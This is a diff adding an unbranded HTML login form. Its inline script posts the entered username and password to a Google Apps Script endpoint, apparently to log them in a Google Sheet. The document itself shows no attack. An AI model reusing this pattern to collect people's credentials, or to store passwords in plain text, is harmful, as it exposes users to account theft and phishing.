@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Form</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <div class="login-box cf">
+    <h2>Login</h2>
+    <form name="Submit Form to Google Sheets">
+      <div class="user-box">
+        <input type="text" id="Username" name="nama">
+        <label for="Username">Username</label>
+      </div>
+      <div class="user-box">
+        <input type="password" name="password" id="password">
+        <label for="password">Password</label>
+      </div>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxQzA2CMC1JJyodFgL_VggS4YVh8ttaVJDKlIMyijzhRfcZ5EtoeDulyQ5gUX57Y6uGKg/exec'
+    const form = document.forms['Submit Form to Google Sheets']
+
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+        .then(response => console.log('Success!', response))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+</body>
+
+</html>
